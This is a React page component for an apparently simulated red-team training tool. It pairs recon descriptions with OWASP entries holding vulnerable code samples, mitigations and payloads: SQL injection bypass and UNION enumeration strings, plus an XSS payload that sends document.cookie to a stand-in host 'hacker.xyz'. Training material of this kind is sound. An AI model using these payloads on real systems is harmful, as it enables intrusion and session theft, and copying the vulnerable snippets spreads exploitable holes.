import React, { useState } from 'react';
import { Terminal, Shield, Play, Loader, ShieldAlert, Cpu, CheckCircle } from 'lucide-react';
import { useAuth, api } from '../context/AuthContext';
import { useToast } from '../context/ToastContext';
import redteamBgDark from '../assets/images/red_team_bg.png';
import redteamBgLight from '../assets/images/red_team_bg_light.png';

const RECON_TOOLS = [
  { id: 'info_gathering', name: 'Information Gathering', desc: 'Query DNS, Whois, and MX records of the target.' },
  { id: 'port_scanning', name: 'Port Scanning', desc: 'Scan common ports to discover open network doors.' },
  { id: 'service_detection', name: 'Service Detection', desc: 'Analyze port banners to identify software version names.' },
  { id: 'directory_enum', name: 'Directory Enumeration', desc: 'Enumerate directories to look for exposed directories/files.' },
  { id: 'technology_detection', name: 'Technology Detection', desc: 'Inspect request headers and scripts to detect frameworks.' }
];

const VULNERABILITIES = [
  {
    name: 'SQL Injection (SQLi)',
    key: 'SQLi',
    severity: 'critical',
    score: 9.8,
    owasp: 'A03:2021-Injection',
    explain: 'SQL Injection occurs when user inputs are concatenated directly into backend database queries rather than being parameterized, allowing attackers to execute arbitrary SQL commands.',
    codeExample: `// VULNERABLE CODE\nconst query = "SELECT * FROM users WHERE email = '" + req.body.email + "' AND password = '" + req.body.password + "'";\nconst user = await db.query(query);`,
    payloads: [
      { label: "Bypass Authentication", value: "' OR '1'='1" },
      { label: "Union Database Version Discovery", value: "' UNION SELECT null, @@version, null --" },
      { label: "Database Table Enumeration", value: "' UNION SELECT null, table_name, null FROM information_schema.tables --" }
    ],
    prevention: 'Always use Parameterized Queries (Prepared Statements) or an ORM. Validate and sanitize user inputs at the server boundary.'
  },
  {
    name: 'Cross Site Scripting (XSS)',
    key: 'XSS',
    severity: 'high',
    score: 8.2,
    owasp: 'A03:2021-Injection',
    explain: 'XSS occurs when user inputs are reflected back into the browser output without proper encoding or sanitization, allowing attackers to execute malicious JavaScript within the victim\'s browser.',
    codeExample: `// VULNERABLE CODE\napp.get('/welcome', (req, res) => {\n  res.send("<h1>Welcome, " + req.query.name + "</h1>");\n});`,
    payloads: [
      { label: "Trigger Alert Dialog", value: "<script>alert('System Hacked')</script>" },
      { label: "Cookie Theft Simulation", value: "<script>fetch('http://hacker.xyz/steal?cookie=' + document.cookie)</script>" },
      { label: "DOM Defacement Exploit", value: "<img src=x onerror=\"document.body.innerHTML='<h1>COMPROMISED</h1>'\">" }
    ],
    prevention: 'Apply Context-Aware Output Encoding. Configure a strict Content-Security-Policy (CSP) header, and use input sanitizers.'
  },
  {
    name: 'Insecure Direct Object Reference (IDOR)',
    key: 'IDOR',
    severity: 'high',
    score: 8.5,
    owasp: 'A01:2021-Broken Access Control',
    explain: 'IDOR occurs when an application exposes a reference to an internal implementation object (like database keys or files) without checking authorization, letting users access other records simply by altering the key.',
    codeExample: `// VULNERABLE CODE\napp.get('/api/users/:id', async (req, res) => {\n  const user = await db.User.findById(req.params.id);\n  res.json(user);\n});`,
    payloads: [
      { label: "Access Administrator Record", value: "/api/users/admin_user_id" },
      { label: "Access Analyst Account Settings", value: "/api/users/analyst_user_id" }
    ],
    prevention: 'Implement Object-Level Access Control. Ensure every request validates the session credentials against the requested object ID.'
  },
  {
    name: 'Security Misconfiguration',
    key: 'Security Misconfiguration',
    severity: 'medium',
    score: 5.3,
    owasp: 'A05:2021-Security Misconfiguration',
    explain: 'Security Misconfiguration occurs when servers are left running with default credentials, verbose error reporting (revealing stack traces), directory listing active, or missing required security response headers.',
    codeExample: `// VULNERABLE CODE\napp.use((err, req, res, next) => {\n  res.status(500).send(err.stack);\n});\n// Server HTTP responses do not contain X-Frame-Options or CSP headers.`,
    payloads: [
      { label: "Inspect Exposed Server Folders", value: "/config/development.json" },
      { label: "Trigger Verbose Database Trace", value: "/api/items?filter={invalid-json" }
    ],
    prevention: 'Configure security headers (Helmet), disable verbose debugging on production nodes, and restrict static directories.'
  },
  {
    name: 'Sensitive Data Exposure',
    key: 'Sensitive Data Exposure',
    severity: 'high',
    score: 7.5,
    owasp: 'A02:2021-Cryptographic Failures',
    explain: 'Sensitive Data Exposure occurs when applications store passwords in plain text, transmit files over unencrypted channels, or fail to secure session cookies, leading to credential theft and session hijacking.',
    codeExample: `// VULNERABLE CODE\nres.cookie('token', token, {\n  httpOnly: false,\n  secure: false\n});`,
    payloads: [
      { label: "Sniff Unsecured Cookies", value: "document.cookie" },
      { label: "Intercept Plaintext Payload", value: "HTTP POST Body: password=admin123" }
    ],
    prevention: 'Implement strong hashing (bcrypt), enforce TLS/HTTPS, and set HttpOnly, Secure, and SameSite cookie options.'
  }
];

export const RedTeam = () => {
  const { theme } = useAuth();
  const { showToast } = useToast();
  const [activeTab, setActiveTab] = useState('recon');
  const [selectedRecon, setSelectedRecon] = useState(RECON_TOOLS[0].id);
  const [terminalOutput, setTerminalOutput] = useState(['[+] Command console initialized. Ready for operations.']);
  const [reconLoading, setReconLoading] = useState(false);

  const [selectedVulnIdx, setSelectedVulnIdx] = useState(0);
  const [customPayload, setCustomPayload] = useState(VULNERABILITIES[0].payloads[0].value);
  const [exploitLog, setExploitLog] = useState([]);
  const [exploitLoading, setExploitLoading] = useState(false);

  const handleRunRecon = async () => {
    setReconLoading(true);
    setTerminalOutput([`[*] Executing simulated recon scan: ${selectedRecon}...`]);
    try {
      const response = await api.post('/simulation/run-recon', { scanType: selectedRecon });
      const output = response.data.output || [];
      
      output.forEach((line, idx) => {
        setTimeout(() => {
          setTerminalOutput((prev) => [...prev, line]);
          if (idx === output.length - 1) {
            setReconLoading(false);
            showToast('Reconnaissance scan simulation completed.', 'success');
          }
        }, (idx + 1) * 300);
      });
    } catch (err) {
      setTerminalOutput((prev) => [...prev, '[!] Error connecting to simulation endpoint.']);
      setReconLoading(false);
    }
  };

  const handleSelectVuln = (idx) => {
    setSelectedVulnIdx(idx);
    setCustomPayload(VULNERABILITIES[idx].payloads[0]?.value || '');
    setExploitLog([]);
  };

  const handleRunExploit = async () => {
    const vuln = VULNERABILITIES[selectedVulnIdx];
    setExploitLoading(true);
    setExploitLog([`[*] Preparing exploit request for ${vuln.name}...`]);

    try {
      const response = await api.post('/simulation/run-exploit', {
        vulnType: vuln.key,
        payload: customPayload
      });
      const data = response.data;
      
      data.outputLog.forEach((line, idx) => {
        setTimeout(() => {
          setExploitLog((prev) => [...prev, line]);
          if (idx === data.outputLog.length - 1) {
            setExploitLoading(false);
            if (data.success) {
              showToast(`Simulation Success: Compromised ${vuln.key}!`, 'warning');
            } else {
              showToast(`Simulation Blocked: Defenses intercepted ${vuln.key}.`, 'success');
            }
          }
        }, (idx + 1) * 400);
      });
    } catch (err) {
      setExploitLog((prev) => [...prev, '[!] System connection aborted. Target offline.']);
      setExploitLoading(false);
    }
  };

  const currentVuln = VULNERABILITIES[selectedVulnIdx];

  return (
    <div
      style={{ backgroundImage: `url(${theme === 'dark' ? redteamBgDark : redteamBgLight})` }}
      className="relative min-h-[calc(100vh-4rem)] p-6 bg-cover bg-center bg-no-repeat bg-parallax transition-all duration-300"
    >
      <div className={`absolute inset-0 z-0 backdrop-blur-[2px] transition-colors duration-300 ${
        theme === 'dark' ? 'bg-slate-950/60' : 'bg-white/45'
      }`} />
      <div className="relative z-10 space-y-6">
        <div>
          <h1 className="text-2xl font-bold tracking-tight text-white">Red Team Operations (Attack)</h1>
          <p className="text-xs text-slate-400 mt-1">Audit local configurations by simulating common application-layer attack vectors.</p>
        </div>

        <div className="flex gap-2 p-1 rounded-2xl glassmorphism w-fit">
          <button
            onClick={() => setActiveTab('recon')}
            className={`px-6 py-2.5 rounded-xl text-xs font-bold transition-all ${
              activeTab === 'recon' ? 'bg-red-600 text-white glow-red' : 'text-slate-400 hover:text-white'
            }`}
          >
            Reconnaissance
          </button>
          <button
            onClick={() => setActiveTab('exploit')}
            className={`px-6 py-2.5 rounded-xl text-xs font-bold transition-all ${
              activeTab === 'exploit' ? 'bg-red-600 text-white glow-red' : 'text-slate-400 hover:text-white'
            }`}
          >
            Vulnerability Exploits
          </button>
        </div>

        {activeTab === 'recon' ? (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div className={`p-6 rounded-3xl border shadow-xl space-y-4 ${
              theme === 'dark' ? 'glassmorphism border-slate-800/80 text-white' : 'light-glassmorphism border-slate-200 text-slate-800'
            }`}>
              <h2 className="text-sm font-bold uppercase tracking-wider text-slate-400">Recon Tools</h2>
              <div className="flex flex-col gap-2">
                {RECON_TOOLS.map((tool) => (
                  <button
                    key={tool.id}
                    onClick={() => setSelectedRecon(tool.id)}
                    className={`p-4 rounded-xl text-left border transition-all ${
                      selectedRecon === tool.id
                        ? 'border-red-500/40 bg-red-500/10 text-white'
                        : 'border-slate-800 hover:bg-slate-500/5 text-slate-400 hover:text-white'
                    }`}
                  >
                    <p className="text-xs font-bold">{tool.name}</p>
                    <p className="text-[10px] text-slate-500 mt-1 leading-normal">{tool.desc}</p>
                  </button>
                ))}
              </div>
              <button
                onClick={handleRunRecon}
                disabled={reconLoading}
                className="w-full py-3 bg-red-600 hover:bg-red-500 text-white text-xs font-bold rounded-xl transition-all glow-red flex items-center justify-center gap-2"
              >
                {reconLoading ? <Loader className="animate-spin" size={16} /> : <Play size={14} />}
                <span>Execute Scan Command</span>
              </button>
            </div>

            <div className="lg:col-span-2 flex flex-col h-[400px] lg:h-auto bg-black rounded-3xl border border-slate-800 overflow-hidden shadow-2xl">
              <div className="flex items-center justify-between px-6 py-3 bg-slate-950 border-b border-slate-800">
                <div className="flex items-center gap-2 text-xs font-bold text-red-500">
                  <Terminal size={14} />
                  <span>recon_console.sh</span>
                </div>
                <div className="flex gap-1.5">
                  <span className="w-2.5 h-2.5 rounded-full bg-slate-800" />
                  <span className="w-2.5 h-2.5 rounded-full bg-slate-800" />
                  <span className="w-2.5 h-2.5 rounded-full bg-slate-800" />
                </div>
              </div>
              <div className="flex-1 p-6 font-mono text-[11px] text-emerald-400 overflow-y-auto space-y-2 select-text">
                {terminalOutput.map((line, idx) => (
                  <p key={idx} className="leading-relaxed whitespace-pre-wrap">{line}</p>
                ))}
              </div>
            </div>
          </div>
        ) : (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div className="space-y-4">
              <div className={`p-6 rounded-3xl border shadow-xl space-y-4 ${
                theme === 'dark' ? 'glassmorphism border-slate-800/80 text-white' : 'light-glassmorphism border-slate-200 text-slate-800'
              }`}>
                <h2 className="text-sm font-bold uppercase tracking-wider text-slate-400">Target Vectors</h2>
                <div className="flex flex-col gap-2">
                  {VULNERABILITIES.map((vuln, idx) => (
                    <button
                      key={vuln.key}
                      onClick={() => handleSelectVuln(idx)}
                      className={`p-4 rounded-xl text-left border transition-all ${
                        selectedVulnIdx === idx
                          ? 'border-red-500/40 bg-red-500/10 text-white'
                          : 'border-slate-800 hover:bg-slate-500/5 text-slate-400 hover:text-white'
                      }`}
                    >
                      <div className="flex justify-between items-center gap-2">
                        <span className="text-xs font-bold">{vuln.name}</span>
                        <span className={`text-[8px] px-1.5 py-0.5 rounded font-bold uppercase ${
                          vuln.severity === 'critical' ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 'bg-orange-500/10 text-orange-400 border border-orange-500/20'
                        }`}>{vuln.severity}</span>
                      </div>
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <div className="lg:col-span-2 space-y-6">
              <div className={`p-6 rounded-3xl border shadow-xl space-y-5 ${
                theme === 'dark' ? 'glassmorphism border-slate-800/80 text-white' : 'light-glassmorphism border-slate-200 text-slate-800'
              }`}>
                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 pb-4 border-b border-slate-800/50">
                  <div>
                    <h2 className="text-base font-extrabold">{currentVuln.name}</h2>
                    <p className="text-[10px] text-slate-500 mt-0.5 font-bold uppercase">OWASP: {currentVuln.owasp}</p>
                  </div>
                  <div className="flex items-center gap-3">
                    <span className="text-xs text-slate-400">Risk Metric:</span>
                    <span className="px-2.5 py-0.5 bg-red-500/10 text-red-500 border border-red-500/30 text-xs font-black rounded-lg">CVSS {currentVuln.score}</span>
                  </div>
                </div>

                <p className="text-xs text-slate-400 leading-relaxed">{currentVuln.explain}</p>

                <div className="space-y-2">
                  <p className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Vuln Signature</p>
                  <pre className="p-4 bg-black border border-slate-800 rounded-xl overflow-x-auto text-[10px] font-mono text-slate-300 leading-relaxed select-text">
                    {currentVuln.codeExample}
                  </pre>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <label className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Select Injection Payload</label>
                      <select
                        value={customPayload}
                        onChange={(e) => setCustomPayload(e.target.value)}
                        className={`w-full py-2.5 px-3 rounded-xl text-xs border focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all ${
                          theme === 'dark' ? 'bg-slate-950/50 border-slate-800 text-slate-200' : 'bg-white border-slate-200 text-slate-800'
                        }`}
                      >
                        {currentVuln.payloads.map((p, idx) => (
                          <option key={idx} value={p.value}>{p.label} ({p.value.substring(0, 15)}...)</option>
                        ))}
                      </select>
                    </div>

                    <div className="space-y-2">
                      <label className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Or Write Raw Payload</label>
                      <input
                        type="text"
                        value={customPayload}
                        onChange={(e) => setCustomPayload(e.target.value)}
                        className={`w-full py-2.5 px-3 rounded-xl text-xs border focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all ${
                          theme === 'dark' ? 'bg-slate-950/50 border-slate-800 text-slate-200' : 'bg-white border-slate-200 text-slate-800'
                        }`}
                      />
                    </div>

                    <button
                      onClick={handleRunExploit}
                      disabled={exploitLoading}
                      className="w-full py-3 bg-red-600 hover:bg-red-500 text-white text-xs font-bold rounded-xl transition-all glow-red flex items-center justify-center gap-2"
                    >
                      {exploitLoading ? <Loader className="animate-spin" size={16} /> : <Terminal size={14} />}
                      <span>Launch Exploit Injection</span>
                    </button>
                  </div>

                  <div className="flex flex-col bg-black rounded-2xl border border-slate-800 overflow-hidden min-h-[220px]">
                    <div className="px-4 py-2 bg-slate-950 border-b border-slate-800 flex items-center gap-2 text-[10px] font-bold text-red-500">
                      <Cpu size={12} />
                      <span>exploit_output.log</span>
                    </div>
                    <div className="flex-1 p-4 font-mono text-[10px] text-emerald-400 overflow-y-auto space-y-1.5 select-text">
                      {exploitLog.length === 0 ? (
                        <p className="text-slate-500 italic">Playground idle. Configure payload and trigger execution.</p>
                      ) : (
                        exploitLog.map((line, idx) => (
                          <p key={idx} className={`leading-normal ${
                            line.includes('blocked') || line.includes('Threat Detected') ? 'text-red-400 font-bold' :
                            line.includes('compromised') || line.includes('success') ? 'text-amber-400 font-bold' : 'text-emerald-400'
                          }`}>{line}</p>
                        ))
                      )}
                    </div>
                  </div>
                </div>

                <div className="pt-4 border-t border-slate-800/50 grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                  <div className="space-y-1">
                    <div className="flex items-center gap-1.5 text-blue-400 font-bold">
                      <Shield size={14} />
                      <span>Mitigation Standard</span>
                    </div>
                    <p className="text-slate-400 leading-relaxed text-[11px]">{currentVuln.prevention}</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
